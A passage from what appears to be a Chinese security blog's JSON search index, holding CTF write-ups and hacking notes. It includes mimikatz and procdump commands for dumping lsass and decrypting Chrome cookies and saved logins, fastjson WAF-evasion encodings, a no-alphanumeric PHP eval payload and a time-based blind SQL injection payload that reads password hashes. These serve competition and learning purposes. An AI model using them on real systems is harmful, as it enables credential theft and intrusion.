$num2 = filter($ppp['number2']); $num3 = filter($ppp['number3']); $num4 = filter($ppp['number4']);$num5 = filter($ppp['number5']); if(isset($num1) &amp;&amp; is_numeric($num1)){ die(\"非数字\");}else{ if($num1 &gt; 1024){ echo \"第一层\"; if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){ echo \"第二层\"; if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){ echo \"第三层\"; if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){ echo \"第四层\"; if(!isset($num5)||(strlen($num5)==0)) die(\"no\"); $b=json_decode(@$num5); if($y = $b === NULL){ if($y === true){ echo \"第五层\"; include 'KeY1lhv.php'; echo $KEY1; } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no111\"); }} number1 number2使用科学计数法number3 md5前缀碰撞number4 带负号的0值绕过number5 json {1}即为true成功拿到KEY1 Key2下载文件压缩包内有大量docx文件编写脚本提取docx正文文本 寻找带有KEY的文本找到KEY2KEY1 KEY2提交到网站 成功getflag","permalink":"https://rce.moe/2021/06/14/QWB-2021-WEB-WP/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2021年春秋杯网络安全联赛春季赛-CTF-GameContract-WriteUp","date":"2021/06/08","text":"今年春秋杯春秋杯出了一道智能合约杂项 从来没接触过ETH合约的CTF题 网上找了一堆文章做出来了这道题 这里详细写出解题过程以便学习ETH智能合约的调用 GameContract题目分析访问题目网站 要求使用ETH钱包地址注册 使用浏览器扩展metamask注册之(这也是为了方便后续对合约函数的调用)准备好 Rinkeby 测试网络的 ETH 用作手续费转入所注册后给的 ETH 地址中 (这是专门去问了下主办方才知道的 网页上没有写是什么测试网络 (ETH比较大的测试网络有4个) 注册后居然还看不到自己的ETH地址)看到如此大的价格波动 肯定是利用价格波动赚差价了到这里还不知道GETFLAG的条件 这是一个ETH合约题 所以我们转向ETH合约去看看合约代码写了什么使用测试网络区块链浏览器查看交易列表 发现了合约地址区块链浏览器自带的反编译工具 反编译合约代码审计源码发现一个疑似getflag的函数 (这里面还有一个坑 getflag函数名没有公开 询问主办方才给了函数名 在最后放出了合约的部分源码)需要使用 10*10^6 个币(1000W)兑换flag 初始有1W币之后就进行股票交易操作来满足题目要求了通过利用股票价格波动进行频繁买卖操作最终得到了1000W币 合约的调用下面是对合约函数的调用操作 (看到排行榜有个大佬几亿个币却不会兑换flag太可惜了)这里用到的工具是http://remix.ethereum.org/这是一个ETH合约开发调试工具 这里用来调用现有的链上合约打开网站右键新建一个文件 命名为*.sol 例如test.sol // SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.7.0 &lt;0.9.0;/** * @title Storage * @dev Store &amp; retrieve value in a variable */contract TEST { function payForFlag() public{ }} 这里只用写出要调用的函数里面不需要写功能 比较像c语言的函数声明 但还有很大的区别 写完一定要ctrl+s保存并编译 function TEST123(uint256 TEST) public view returns (uint256){ } 这个是带传参和返回值的写法写完函数声明点击左侧Deploy &amp; run transactions环境选择 Injected Web3此时metamask扩展会弹出授权窗口 输入密码 授权要操作的ETH账号(这里是股票平台注册时填写的ETH地址所属的钱包账号 )授权成功后会显示钱包地址和ETH余额 (在发起合约交易一定要保证账户有充足的ETH用作手续费)这里不使用本地调试 而是调用链上合约所以只需要在At Address右侧填入合约地址0xec36a74b9d08e796662c032d61530d94061679ea点击At Address按钮 (如果按钮灰色 根据下面的报错提示 请检查合约地址是否正确 上面的步骤是否正确完成)最后一步展开点击操作按钮 在浏览器钱包弹出的窗口授权 即可调用合约通过钱包查看交易地址 在区块链浏览器查看交易状态 Status为Success即为调用成功在注册邮箱收取flag 本文首发于安全客 转载请注明来源","permalink":"https://rce.moe/2021/06/08/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9B-CTF-GameContract-WriteUp/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"}],"title":"chrome 浏览器cookies&登陆凭据解密&Windows系统下DPAPI中的MasterKey获取","date":"2021/05/05","text":"谷歌浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取谷歌浏览器の加解密Chrome cookies 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies”Chrome 登陆凭据 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” 谷歌浏览器使用了windows自带的DPAPI进行加解密操作 解密方法有两种 第一种方法 :直接以加密数据的用户身份调用DPAPI解密Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotectps:如果没有目标加密文件的用户的权限 或者是想要解密机器上其他用户加密储存的信息这种方法就不能使用了 第二种方法 : 获取MasterKey脱机解密DPAPI加密的数据需要使用MasterKey解密如果可以拿到MasterKey的话就可直接解密数据Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotect /masterkey:36af83d6e6a67e4f67e6f45ca0464a031946182b3e67d72ce9c08e22d7a720b5d2a768418291f28fb79c6def7b068f84955e764e87e36c6b0b666e05fb7eb9f4 拿masterkey的几种方法方法一 直接在目标机器运行Mimikatz提取privilege::debugsekurlsa::dpapi(需目标用户已登陆) 方法二 转储lsass.exe 进程从内存提取masterkey如果目标用户已经登陆 lsass进程的内存中会存在masterkey 转储之 使用Mimikatz提取procdump.exe -accepteula -ma lsass.exe 666.dmpsekurlsa::minidump lsass.dmpsekurlsa::dpapi 方法三 导出SAM注册表 提取user hash 解密masterkey文件需SYSTEM权限reg save HKLM\\SYSTEM SS.hivreg save HKLM\\SECURITY SE.hivm/u 值解密Masterkey文件mimikatz log “lsadump::secrets /system:SS.hiv /security:SE.hiv”拿到DPAPI_SYSTEM m/u 后半部分的值 (HASH)这种方法对应MASTERKEY位置在C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User(一个个文件试总会解密成功的 现在不知道怎么获取用户对应的GUIDmimikatz “dpapi::masterkey /in:C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User{GUID} /system:HASH”即可拿到masterkey 方法四 已知用户密码(或hash) 用户SID(masterkey路径) 拿到加密后的masterkey文件这是当时 volatility内存取证题遇到的问题 这里就随手记录下来了第一步获取用户密码(或hash)找到masterkey文件位置这种方法的文件位置在C:\\Users{username}\\AppData\\Roaming\\Microsoft\\Protect{SID}{GUID}dpapi::masterkey /in:C:\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-262715442-3761430816-2198621988-1001\\57935170-beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:vIg*q3x6GFa5aFBA /protected/password可以用/hash:密码hash代替(NTLM or SHA1)即可拿到masterkey 方法五 通过域管理员导出backup key 恢复Master key利用条件:目标机器加入域 要拿的是域用户的key 拿到域管理员权限lsadump::backupkeys /system:123.com /export (需要域管理员权限) 导出domain backup keydpapi::masterkey /in:”C:\\Users\\spotless.OFFENSE\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe” /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk即可拿到masterkey 参考 渗透技巧-获取Windows系统下DPAPI中的MasterKey howto-~-scheduled-tasks-credentials Reading DPAPI Encrypted Secrets with Mimikatz and C++ Operational Guidance for Offensive User DPAPI Abuse","permalink":"https://rce.moe/2021/05/05/chrome-%E6%B5%8F%E8%A7%88%E5%99%A8cookies-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}],"title":"fastjson绕过WAF的TIPS","date":"2021/05/05","text":"fastjson绕WAFのTIPSfastjson对字符串转义处理の特性fast解析字符串支持\\u Unicode转义和 \\x HEX转义的字符串解码 (一般json仅支持Unicode转义 fastjson多了对十六进制转义的支持)例如 字符串 driverClassLoader Unicode转义 编码 \\uxxxx(json通用)\\u0064\\u0072\\u0069\\u0076\\u0065\\u0072\\u0043\\u006C\\u0061\\u0073\\u0073\\u004C\\u006F\\u0061\\u0064\\u0065\\u0072HEX转义编码 \\x** (fastjson only)\\x64\\x72\\x69\\x76\\x65\\x72\\x43\\x6C\\x61\\x73\\x73\\x4C\\x6F\\x61\\x64\\x65\\x72fastjson中两者可以混合使用例:\\x64\\u0072\\x0069\\u0076\\x65\\u0072\\x43\\x6C\\u0061\\u0073\\x73\\x4C\\x006F\\x61\\x64\\x65\\u0072使用CyberChef进行方便的编解码这种方法可以绕过一些字符串规则匹配的waf 除此之外playload也可以加入%08%09这种空白字符扰乱waf对json匹配解析","permalink":"https://rce.moe/2021/05/05/fastjson%E7%BB%95WAF-TIPS/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2020安恒DASCTF八月浪漫七夕战 ezrce Writeup","date":"2020/08/25","text":"早上有点事 差点忘了有比赛233 &lt;?phperror_reporting(0);show_source(__FILE__);$code=$_POST['code'];$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','@','\\~','\\^','\\[','\\]','\\&amp;','\\?','\\&lt;','\\&gt;','\\*','1','2','3','4','5','6','7','8','9','0');//This blacklist is so stupid.$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) { if (preg_match ('/' . $blacklisted . '/im', $code)) { die('you are not smart'); }}eval(\"echo($code)\");?&gt; 题目过滤了全部字母和数字和部分位运算符 由http头X-Powered-By: PHP/7.3.21可知 服务器PHP版本为7.3.21 需要构造无字母数字的playload 虽然过滤了部分位运算符 但还是漏了一个| 或运算 利用或运算符构造playload 调用readfile函数 读取根目录flagplayload code=('````````'|'\u0012\u0005\u0001\u0004\u0006 \u0005')('/````'|'/\u0006 \u0001\u0007'));//bas64Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw==","permalink":"https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"}],"title":"记一次mysql盲注遇到的问题","date":"2020/08/15","text":"前几天我把一个CVE写成EXP的时候遇到了一个问题目标使用了直接拼接SQL语句的方法进行sql查询而且使用的是UPDATE方法sql_query(\"UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (\" . implode(\", \", $_POST[conusr]) . \") AND status='pending'\");根据拼接的语句 我写出了这样的playload 准备读取数据库中用户表的密码hashconusr[]=1) and if(ascii(mid((select group_concat(passhash) from users),%s,1))=%s,sleep(1),0)#发现执行后报出错误1093 - You can't specify target table 'users' for update in FROM clause这里发生了一个非常巧的事情 刚好UPDATE操作的和要select操作的是同一张表MYSQL不允许更新一张表的条件来自于查询这张表解决方法:在外面再套一层selectUPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (1) and if(ascii(mid((select * from (select group_concat(passhash) from users)as a),1,1))=1,sleep(1),0)#","permalink":"https://rce.moe/2020/08/15/%E8%AE%B0%E4%B8%80%E6%AC%A1mysql%E7%9B%B2%E6%B3%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"GeekPwn 2020 云上挑战赛 cosplay! writeup","date":"2020/07/14","text":"学生党 业余挖洞 只会点web 第一次写writeup，不大会写，请多关照。 看到这个题目cosplay! 就先看了眼这道题 居然拿到了个一血 0.0尝试上传文件发现是通过COS(腾讯的对象云储存)上传文件var Bucket = ‘933kpwn-1253882285’;var Region = ‘ap-shanghai’; var cos = new COS({ getAuthorization: function (options, callback) { var url = '/GetTempKey?path=/upload'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.onload = function (e) { try { var data = JSON.parse(e.target.responseText); var credentials = data.Credentials; } catch (e) { } if (!data || !credentials) return console.error('credentials invalid'); callback({ TmpSecretId: credentials.TmpSecretId, TmpSecretKey: credentials.TmpSecretKey, XCosSecurityToken: credentials.Token, ExpiredTime: data.ExpiredTime, }); }; xhr.send(); }}); 分析源码发现这个页面是在本地利用从服务器获取的临时密钥给上传参数签名的一般上传用的普通密钥 而且是在后端给请求做签名但是临时密钥如果存在权限控制不当(临时密钥生成的时候可以限制操作方法和范围) 也可以在密钥有效期内完全控制储存桶(这道题就是这种情况) 访问 /GetTempKey?path=/ 取得临时密钥和令牌(临时密钥生成的时候可以限制操作路径)根据腾讯COS的文档 使用临时密钥和令牌访问储存桶为了方便这里使用腾讯云官方提供的PHP SDK 来操作储存桶临时密钥没有操作限制 成功获取储存桶内所有的对象键列表发现 Flag键名为 f1L9@/flag.txt 读取f1L9@/flag.txt 拿到 flag","permalink":"https://rce.moe/2020/07/14/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-witeup/","photos":[]},{"tags":[],"title":"Hello World","date":"2020/04/12","text":"第一个博客最近试试开始写点博客","permalink":"https://rce.moe/2020/04/12/hello-world/","photos":[]}],"categories":[],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"},{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"},{"name":"强网杯","slug":"强网杯","permalink":"https://rce.moe/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}]}